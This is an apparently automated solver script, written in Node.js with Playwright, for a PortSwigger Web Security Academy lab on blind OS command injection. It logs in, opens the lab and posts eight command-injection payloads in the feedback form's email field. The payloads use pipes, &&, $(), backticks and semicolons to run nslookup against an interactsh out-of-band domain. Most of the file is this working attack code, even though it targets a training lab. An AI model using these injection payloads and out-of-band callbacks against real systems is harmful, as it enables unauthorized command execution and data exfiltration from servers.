#!/usr/bin/env node
/**
 * OSCmd #4 - Blind OS command injection with OOB interaction
 * Direct implementation with better payloads
 */
const { chromium } = require('playwright');
const fs = require('fs');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
const LAB_PAGE = 'https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band';
const INTERACTSH_DOMAIN = 'd7lns342olvugbcqmrsgtbseutaq3zpkw.oast.online';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  
  try {
    console.log('[*] Login to PortSwigger...');
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await sleep(2000);
    
    console.log('[*] Launch lab...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    await (await page.locator('a:has-text("ACCESS THE LAB")').first()).click();
    await sleep(40000);
    
    let labUrl = null;
    let labPage = null;
    for (const p of ctx.pages()) {
      const u = p.url();
      if (u.includes('web-security-academy.net')) { 
        labUrl = u.replace(/\/$/, ''); 
        labPage = p;
        break; 
      }
    }
    if (!labUrl) throw new Error('No lab URL');
    console.log('[+] Lab URL:', labUrl);
    
    // Navigate to feedback form
    await labPage.goto(labUrl + '/feedback', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2000);
    
    const csrf = await labPage.locator('input[name=csrf]').first().getAttribute('value').catch(() => '');
    console.log('[+] CSRF:', csrf);
    
    // Try multiple payload variations
    const marker = 'oscmd4x' + Math.random().toString(36).substring(2, 8);
    const payloads = [
      `test@test.com|nslookup ${marker}.${INTERACTSH_DOMAIN}|`,
      `test@test.com&&nslookup ${marker}.${INTERACTSH_DOMAIN}&&`,
      `test@test.com$(nslookup ${marker}.${INTERACTSH_DOMAIN})`,
      `test@test.com\`nslookup ${marker}.${INTERACTSH_DOMAIN}\``,
      `test@test.com;nslookup ${marker}.${INTERACTSH_DOMAIN};`,
      `| nslookup ${marker}.${INTERACTSH_DOMAIN} |`,
      `|| nslookup ${marker}.${INTERACTSH_DOMAIN} ||`,
      `& nslookup ${marker}.${INTERACTSH_DOMAIN} &`,
    ];
    
    console.log('[*] Trying payloads...');
    for (const payload of payloads) {
      const result = await labPage.evaluate(async ({ csrf, payload }) => {
        const body = new URLSearchParams();
        body.set('csrf', csrf);
        body.set('name', 'test');
        body.set('email', payload);
        body.set('subject', 'test');
        body.set('message', 'test');
        const r = await fetch('/feedback/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: body.toString(),
        });
        return r.status;
      }, { csrf, payload });
      console.log(`  Payload "${payload.substring(0, 40)}..." => status ${result}`);
      await sleep(3000);
    }
    
    // Wait for OOB to be detected
    console.log('[*] Waiting 60s for OOB detection...');
    await sleep(60000);
    
    // Verify
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    const html = await page.content();
    const solved = html.includes('is-solved') || html.includes('Congratulations');
    console.log(solved ? 'SOLVED' : 'NOT SOLVED');
    process.exit(solved ? 0 : 1);
  } catch (e) {
    console.error(e.message);
    console.log('NOT SOLVED');
    process.exit(1);
  } finally {
    await browser.close().catch(() => {});
  }
}

main();
